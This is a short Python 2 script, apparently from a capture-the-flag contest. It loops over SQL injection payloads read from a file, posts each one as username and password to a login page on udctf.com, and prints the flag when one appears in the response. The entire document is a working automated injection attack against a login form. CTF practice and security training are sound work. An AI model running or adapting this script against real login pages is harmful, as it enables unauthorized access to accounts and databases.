from bs4 import BeautifulSoup
import requests

with open('SQL.txt') as f:
    payloads = [l.strip() for l in f]

for payload in payloads:
    r = requests.post('http://udctf.com:5005/web/login.php', data = {'username':payload, 'password':payload, 'debug':'1'})
    soup = BeautifulSoup(r.text)
    print soup.text
    if 'udctf' in soup.text.lower():
        start = soup.text.lower().find('udctf')
        end = len(soup.text)
        flag = ''.join(list(soup.text)[start:end])
        print 'payload:', payload
        print soup.prettify()
        print '\nFOUND FLAG:', flag
        break
    print soup.text
    
